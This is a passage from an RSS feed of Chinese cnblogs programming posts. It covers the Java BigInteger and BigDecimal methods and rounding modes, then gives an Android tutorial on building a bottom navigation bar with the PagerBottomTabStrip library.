val)//除法操作，数组的第一个元素作为除法的商，第二个元素作为除法的余数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;mod(BigInteger val); //求余&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;gcd(BigInteger val); //求最大公约数 (以下都简写)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;abs();//返回此值的绝对值&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;and(BigInteger val); //返回 this&amp;amp;val 的BigInteger&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;andNot(BigInteger val); //返回 this&amp;amp;~val 的BigInteger&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;bitCount(); //返回BIgInteger的二进制补码形式中与符号不同的位的数量&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;compareTo(BigInteger val); //将this 与val比较,大于，等于，小于分别返回1,0，-1；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;doubleValue(); //将此BigInteger转换为double型返回；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;getLowestSetBit();//返回此BigInteger最右端1比特的索引；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;hashCode();//返回此BIgInteger的哈希码；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;isProbablePrime();//判断是否为素数(true/false);&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;modInverse(BigInteger m);返回其值为(&lt;span class=&quot;md-inline-math&quot;&gt;&lt;span class=&quot;inline-math-svg math-jax-postprocess&quot;&gt;&lt;span class=&quot;MathJax_Preview&quot;&gt;&lt;span id=&quot;MathJax-Element-7-Frame&quot; class=&quot;MathJax_SVG&quot;&gt;&lt;span class=&quot;md-math-after-sym&quot;&gt;​ &lt;span&gt;mod m)的BigInteger;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;negate();返回(-this)的BigInteger;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;not();// ~this&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;or(BIgInteger val);// 返回(this | val)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;xor(BigInteger val);返回(this^val);&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;toString(int radix);//返回指定基数的字符串形式&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;shiftRight(int n);//返回(this&amp;gt;&amp;gt;n)的BigInteger&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;shiftLeft(int n);//返回值为(thsi&amp;lt;&amp;lt;n)的BigInteger&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;示例：&lt;/span&gt;&lt;/h4&gt;
&lt;pre class=&quot;md-fences md-end-block&quot;&gt;
&lt;span&gt;public class Main{&lt;br/&gt;&lt;span&gt;    public static void main(String[] args) {&lt;br/&gt;&lt;span&gt;        BigInteger bi1 = new BigInteger(&quot;123456789&quot;) ;&lt;span class=&quot;cm-tab&quot;&gt;  // 声明BigInteger对象&lt;br/&gt;&lt;span&gt;        BigInteger bi2 = new BigInteger(&quot;987654321&quot;) ;&lt;span class=&quot;cm-tab&quot;&gt;  // 声明BigInteger对象&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;加法操作：&quot; + bi2.add(bi1)) ;&lt;span class=&quot;cm-tab&quot;&gt;    // 加法操作&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;减法操作：&quot; + bi2.subtract(bi1)) ;&lt;span class=&quot;cm-tab&quot;&gt;   // 减法操作&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;乘法操作：&quot; + bi2.multiply(bi1)) ;&lt;span class=&quot;cm-tab&quot;&gt;   // 乘法操作&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;除法操作：&quot; + bi2.divide(bi1)) ;&lt;span class=&quot;cm-tab&quot;&gt; // 除法操作&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;最大数：&quot; + bi2.max(bi1)) ;&lt;span class=&quot;cm-tab&quot;&gt;  // 求出最大数&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;最小数：&quot; + bi2.min(bi1)) ;&lt;span class=&quot;cm-tab&quot;&gt;  // 求出最小数&lt;br/&gt;&lt;span&gt;        BigInteger result[] = bi2.divideAndRemainder(bi1) ;//求出余数的除法操作&lt;br/&gt;&lt;span&gt;        System.out.println(&quot;商是：&quot; + result[0] + &lt;br/&gt;&lt;span&gt;            &quot;；余数是：&quot; + result[1]) ;&lt;br/&gt;&lt;span&gt;    }&lt;br/&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;二.BigDecimal&lt;/span&gt;&lt;/h3&gt;
&lt;pre class=&quot;md-fences md-end-block&quot;&gt;
&lt;br/&gt;&lt;span&gt;import java.math.BigDecimal;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal(double val) //构造 将double表示形式转换为BIgDecimal&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal(int val)//同上&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal(String val)//将字符串表示形式转换为BigDecimal&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal add(BigDecimal augend)//普通加法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal subtract(BigDecimal subtrahend)//普通减法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal multiply(BigDecimal multiplicand)//普通乘法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal divide(BigDecimal divisor)//普通除法&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigDecimal pow(int n) //返回大数的n次幂&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;one.compareTo(two); //在数字上比较大小（大于，等于，小于分别返回1，0 -1）；&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;toString()                将BigDecimal对象的数值转换成字符串。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;doubleValue()          将BigDecimal对象中的值以双精度数返回。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;floatValue()             将BigDecimal对象中的值以单精度数返回。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;longValue()             将BigDecimal对象中的值以长整数返回。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;intValue()               将BigDecimal对象中的值以整数返回。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;示例：&lt;/span&gt;&lt;/h4&gt;
&lt;pre class=&quot;md-fences md-end-block&quot;&gt;
&lt;span&gt;public class Main{&lt;br/&gt;&lt;span&gt;&lt;span class=&quot;cm-tab&quot;&gt;    public static void main(String[] args) {&lt;br/&gt;&lt;span&gt;&lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    System.out.println(&quot;加法运算：&quot; + &lt;span class=&quot;cm-tab&quot;&gt;   &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    MyMath.round(MyMath.add(10.345,3.333),1)) ;&lt;br/&gt;&lt;span&gt;&lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    System.out.println(&quot;减法运算：&quot; + &lt;span class=&quot;cm-tab&quot;&gt;   &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    MyMath.round(MyMath.sub(10.345,3.333),3)) ;&lt;br/&gt;&lt;span&gt;&lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    System.out.println(&quot;乘法运算：&quot; + &lt;span class=&quot;cm-tab&quot;&gt;   &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    MyMath.round(MyMath.mul(10.345,3.333),4)) ;&lt;br/&gt;&lt;span&gt;&lt;span class=&quot;cm-tab&quot;&gt;    &lt;span class=&quot;cm-tab&quot;&gt;    System.out.println(&quot;除法运算：&quot; + MyMath.div(10.345,3.333,3)) ;&lt;br/&gt;&lt;span&gt;&lt;span class=&quot;cm-tab&quot;&gt;    }&lt;br/&gt;&lt;span class=&quot;cm-tab-wrap-hack&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;h4 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;BigDecimal.setScale()方法用于格式化小数点&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScale(val)表示保留val位小数，默认用四舍五入方式 &lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScale(val,BigDecimal.ROUND_DOWN)直接删除多余的小数位，如2.35会变成2.3 &lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScale(val,BigDecimal.ROUND_UP)进位处理，2.35变成2.4 &lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScale(val,BigDecimal.ROUND_HALF_UP)四舍五入，2.35变成2.4&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScaler(val,BigDecimal.ROUND_HALF_DOWN)四舍五入，2.35变成2.3，如果是5则向下舍&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScaler(val,BigDecimal.ROUND_CEILING)接近正无穷大的舍入&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScaler(val,BigDecimal.ROUND_FLOOR)接近负无穷大的舍入，数字&amp;gt;0和ROUND_UP作用一样，数字&amp;lt;0和ROUND_DOWN作用一样&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;setScaler(val,BigDecimal.ROUND_HALF_EVEN)向最接近的数字舍入，如果与两个相邻数字的距离相等，则向相邻的偶数舍入.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 27 Jan 2019 06:57:00 +0000</pubDate>
<dc:creator>SongHL</dc:creator>
<og:description>java中大数以及高精度常用函数 使用java大数类解决问题时我们需要注意两个方面:1、不能有包名，也就是说我们要把主类放到默认的包里，如果你的代码里出现形如package cn.gov.test;这</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/songorz/p/10326634.html</dc:identifier>
</item>
<item>
<title>android开发（1）：底部导航条的实现 | navigation tab | activity的创建 - 广州小程</title>
<link>http://www.cnblogs.com/freeself/p/10326605.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/freeself/p/10326605.html</guid>
<description>&lt;p&gt;&lt;span&gt;底部导航条，在iOS中叫tabbar，在android中叫bottombar或bottom navigation，是一个常用的切换页面的导航条。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;同样，如果有良好的第三方库，我们应该优先考虑，能用好别人的东西，已经很厉害。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;github上的roughike/BottomBar，曾经是热度较高的库，但是已经过时了，没有再维护，加到项目也会遇到编译的问题，所以这里不使用，这里使用的是PagerBottomTabStrip，地址是：&lt;a href=&quot;https://github.com/tyzlmjj/PagerBottomTabStrip&quot; rel=&quot;nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/tyzlmjj/PagerBottomTabStrip&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用PagerBottomTabStrip，既可实现底部导航条，也可实现顶部导航条。&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;（0）添加activity&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;上一节创建的“知音”项目是没带activity的，而实际的APP一定是带activity，所以先给这个项目增加一个界面，让它能正常运行起来。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;把上一节介绍的“知音”项目打开，选中app/src，然后在菜单File-&amp;gt;New的最下方选择activity，如下面截图所示：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;

&lt;div class=&quot;image-view&quot; data-width=&quot;1114&quot; data-height=&quot;749&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-25df663aada35c7b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-25df663aada35c7b.jpg&quot; data-original-width=&quot;1114&quot; data-original-height=&quot;749&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;238568&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;

&lt;div class=&quot;image-view&quot; data-width=&quot;912&quot; data-height=&quot;774&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-cc6dfa1c1cd4cac5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/912/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-cc6dfa1c1cd4cac5.jpg&quot; data-original-width=&quot;912&quot; data-original-height=&quot;774&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;79437&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这样就给APP添加了一个窗口。之时，在res目录下会创建一个layout目录，里面有一个activity_main.xml文件，文件名就是在创建activity时的命名，比如：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;

&lt;div class=&quot;image-view&quot; data-width=&quot;1150&quot; data-height=&quot;326&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-b8d3e08f4f008ab5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-b8d3e08f4f008ab5.jpg&quot; data-original-width=&quot;1150&quot; data-original-height=&quot;326&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;87271&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这个xml就代表一个界面，跟iOS的view与vc一样，界面要跟界面容器也就是activity关联起来，而实际上，在创建xml时，activity_main.xml（界面）对应的activity也被创建起来，而且这个activity已经使用了activity_main.xml，也就是关联起来了，请看截图：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;&lt;img src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/android/%E5%AF%BC%E8%88%AA%E6%9D%A1/mainactivity1.jpg&quot; alt=&quot;xml界面与activity类的关联&quot; data-original-src=&quot;https://free-picture1.oss-cn-shenzhen.aliyuncs.com/android/%E5%AF%BC%E8%88%AA%E6%9D%A1/mainactivity1.jpg&quot;/&gt;
&lt;/div&gt;
&lt;div class=&quot;image-package&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;852&quot; data-height=&quot;337&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-10621e2b53178ac5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/852/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-10621e2b53178ac5.jpg&quot; data-original-width=&quot;852&quot; data-original-height=&quot;337&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;80829&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;&lt;span&gt;另外，在创建activity_main.xml时，还会自动修改了AndroidManifest.xml文件，这个文件是APP的总配置文件。我们需要在这个文件里面加入intent-filter字段，如下面的截图：&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;984&quot; data-height=&quot;454&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-a4b582635e271590.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/984/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-a4b582635e271590.jpg&quot; data-original-width=&quot;984&quot; data-original-height=&quot;454&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;133364&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;&lt;span&gt;如果在创建activity_main时，有勾选Launcher Activity，则会自动生成截图上面的内容。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，简单来说，要显示一个界面，我们要做的是：&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;用File-&amp;gt;new菜单来创建一个界面（xml），不需要考虑关联的事情（AS帮你创建界面与类并关联了）。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;如果有必要则修改AndroidManifest.xml文件。&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span&gt;到此，就可以编译并运行，使用真机或下载某个模拟器（按指引下载即可，但请准备10G的运行空间），就可以看到运行起来的APP。&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;（1）引入PagerBottomTabStrip&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;在app/build.gradle中加入对PagerBottomTabStrip的引用，这个跟iOS使用cocoapods来引用第三方库一样的道理，加入这一句：&lt;/span&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;implementation 'me.majiajie:pager-bottom-tab-strip:+'&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span&gt;在gradle有改动时，as会提示sync。sync一下，成功引入，command+f9编译一下，通过编译。&lt;/span&gt;&lt;/p&gt;
&lt;h4&gt;&lt;span&gt;（2）在activity中使用导航条&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;这里使用约束布局，在布局中加入PageNavigationView实例（也就是导航条）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;操作上，先在xml文本中加入me.majiajie.pagerbottomtabstrip.PageNavigationView对象跟少量属性（比如android:id等），然后在AS的Design界面对其增加位置约束。如果没有位置约束，则运行时会跳到(0,0)位置，那就不是底部的导航条了。如截图：&lt;/span&gt; &lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;1131&quot; data-height=&quot;563&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-592643a5e2c97c4d.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-592643a5e2c97c4d.jpg&quot; data-original-width=&quot;1131&quot; data-original-height=&quot;563&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;189933&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;

&lt;div class=&quot;image-view&quot; data-width=&quot;1248&quot; data-height=&quot;571&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-d680da945e02ac97.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-d680da945e02ac97.jpg&quot; data-original-width=&quot;1248&quot; data-original-height=&quot;571&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;150751&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;&lt;span&gt;对于布局与约束，以后紧接着介绍，这里先让其较正常的运行起来即可。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这时，这个APP运行就可以看到导航条，但是还没有tab。写代码，给导航条添加tab，如截图：&lt;/span&gt; &lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;1033&quot; data-height=&quot;525&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-937f4b3314f9a3df.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1000/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-937f4b3314f9a3df.jpg&quot; data-original-width=&quot;1033&quot; data-original-height=&quot;525&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;159635&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这时运行效果是这样的：&lt;/span&gt; &lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;480&quot; data-height=&quot;854&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-b7c6af91db980b34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-b7c6af91db980b34.png&quot; data-original-width=&quot;480&quot; data-original-height=&quot;854&quot; data-original-format=&quot;image/png&quot; data-original-filesize=&quot;25946&quot;/&gt;&lt;/div&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;h4&gt;&lt;span&gt;（3）响应tab的点击&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;&lt;span&gt;给导航条写上事件监听，如下图：&lt;/span&gt; &lt;/p&gt;
&lt;div class=&quot;image-package&quot;&gt;
&lt;div class=&quot;image-container&quot;&gt;
&lt;div class=&quot;image-view&quot; data-width=&quot;842&quot; data-height=&quot;638&quot;&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/15769694-2aa4bf89753039f3.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/842/format/webp&quot; alt=&quot;&quot; data-original-src=&quot;//upload-images.jianshu.io/upload_images/15769694-2aa4bf89753039f3.jpg&quot; data-original-width=&quot;842&quot; data-original-height=&quot;638&quot; data-original-format=&quot;image/jpeg&quot; data-original-filesize=&quot;164686&quot;/&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
&lt;p&gt;&lt;span&gt;至此，一个底部导航条的基本功能与效果就实现了，是不是很简单？后继再介绍更多的界面效果。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 06:47:00 +0000</pubDate>
<dc:creator>广州小程</dc:creator>
<og:description>底部导航条，在iOS中叫tabbar，在android中叫bottombar或bottom navigation，是一个常用的切换页面的导航条。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/freeself/p/10326605.html</dc:identifier>
</item>
